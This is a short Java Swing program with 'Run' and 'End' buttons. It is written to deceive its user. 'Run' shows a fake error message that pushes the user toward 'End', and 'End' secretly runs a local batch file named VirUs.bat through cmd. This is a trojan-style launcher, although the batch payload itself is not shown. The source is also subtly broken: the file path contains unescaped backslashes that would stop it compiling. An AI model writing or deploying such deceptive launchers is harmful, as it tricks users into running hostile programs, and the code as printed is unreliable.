//package openFile;

import java.io.IOException;
import javax.swing.*;
import java.awt.Color;
import java.awt.event.*;
import java.awt.event.ActionListener;
import java.awt.*;

public class OpenWButton2 extends JFrame implements ActionListener {

	/**
	 *
	 */
	private static final long serialVersionUID = 1L;

	private static JFrame f;

	private JPanel        p;

	private JButton		  button1;
	private JButton		  button2;

	public static void main(String[] args) {

		f.setDefaultLookAndFeelDecorated(true);

		OpenWButton2 app = new OpenWButton2();

        // needed at bottom to of main() to be able to close the application
        f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);

        // automatically resize window (use instead of setSize)
        f.pack();
        f.setSize(100, 100);
        f.setVisible(true);
	}

	public OpenWButton2() {

		f	= new JFrame("");
		p	= new JPanel();
		p.setBackground(Color.black);
		addButtons();

		f.setResizable(false);
		f.pack();
		f.setContentPane(p);
	}

	public void addButtons() {

		button1	= new JButton("Run");
		button1.setBackground(Color.green);
		p.add(button1);
		button1.addActionListener(this);

		button2	= new JButton("End");
		button2.setBackground(Color.red);
		p.add(button2);
		button2.addActionListener(this);
	}

	public void actionPerformed(ActionEvent e) {
		if(e.getSource() == button1) {

			JOptionPane.showMessageDialog(this, "This button does not work try the other one",
				"ERROR", JOptionPane.ERROR_MESSAGE);
		}

		if(e.getSource() == button2) {

				Runtime runtime = Runtime.getRuntime();
				try {
					runtime.exec("cmd /C start D:\Bat\VirUs.bat");
				} catch (IOException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}
			}
		}
}


